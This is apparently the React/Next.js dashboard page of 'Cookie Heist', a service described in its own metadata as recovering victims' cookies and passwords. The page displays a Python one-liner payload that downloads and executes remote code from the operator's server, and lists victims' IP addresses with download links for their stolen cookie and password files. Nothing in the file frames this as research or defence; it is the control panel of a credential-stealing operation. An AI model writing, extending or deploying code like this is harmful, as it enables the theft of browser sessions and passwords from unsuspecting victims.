import Head from 'next/head'
import Header from '../components/header'
import { instance } from "../axios"
import { useState, useEffect } from 'react';
import Loading from '../components/loading';
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faFileArrowDown } from "@fortawesome/free-solid-svg-icons"
import JsFileDownloader from 'js-file-downloader';
import Mobile from '../components/mobile';
import { useRouter } from 'next/router'

export default function Dashboard() {
  const [data, setData] = useState(null)
  const [file, setFile] = useState(null)
  const [isLoading, setLoading] = useState(false)
  const [token, setToken] = useState(null)
  const router = useRouter()


  useEffect(() => {
    setLoading(true)
    instance.get('/user').then(res => {
      setData(res.data)
      setToken(localStorage.getItem("token"))
      instance.get('/data').then(res => {
        setFile(res.data)
        setLoading(false)
      }).catch()
    }).catch(err => {
      localStorage.clear()
      router.push("/")
    })

    
    

    
  }, [])

  if(isLoading) return <Loading/>
  if (!data) return <Loading/>

  function test(){
    console.log(file)
  }

  function download(a){
    new JsFileDownloader({ 
      url: `https://cobaltium360.fr:3001/api/download/${a}`,
      headers: [
        { name: 'Authorization', value: `Barear ${token}` }
      ],
      nameCallback : function ( name )  { 
        return name + ".txt"; 
      } 
    })
    
  }

  function Array(){
    if(file){
      return (
        file.map(file => (
          <div key={file.id} className='container_explain_cookie'>
            <p className='explain_cookie'>{file.filename}</p>
            <p className='explain_cookie'>{file.ip}</p>
            <FontAwesomeIcon className='explain_cookie_icon' onClick={() => download(file.id)} icon={faFileArrowDown}/>
            
          </div>
        ))
      )
    }else{
      return <p>Pas encore de cookies et passwords</p>
    }
  }

  return (
    <div>
      <Head>
        <title>Cookie Heist - Dashboard</title>
        <meta name="description" content="Cookie heist pour récuperer les cookies et password" />
        <link rel="icon" type="image/png" href="/icon.png" />
      </Head>
      <Header />
      <Loading/>
      <Mobile/>
      <div className="container_dashboard">
        <div className='dashboard_bonjour'>
          <h1>Bonjour {data.username} :)</h1>
        </div>
        <div className='container_payload_dashboard'>
          <div className='paylaod_dashboard'>
            <p onClick={test}>Your Payload :</p>
            <div className='container_code_dashboard'>
              <p className='code_dashboard'>from urllib.request import urlopen;exec(urlopen(&quot;https://cobaltium360.fr:3001/api/payload/{data.cle}&quot;).read().decode())</p>
            </div>
          </div>

        </div>
        <div className='container_victimes'>
          <div className='container_paylaod_dashboard'>
            <div className='paylaod_dashboard'>
              <p onClick={test}>Your Cookies And Passwords :</p>
              <div className='container_explain_cookie'>
                <p className='explain_cookie'>filename</p>
                <p className='explain_cookie'>ip</p>
                <p className='explain_cookie'>download</p>
              </div>
              <Array/>
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}


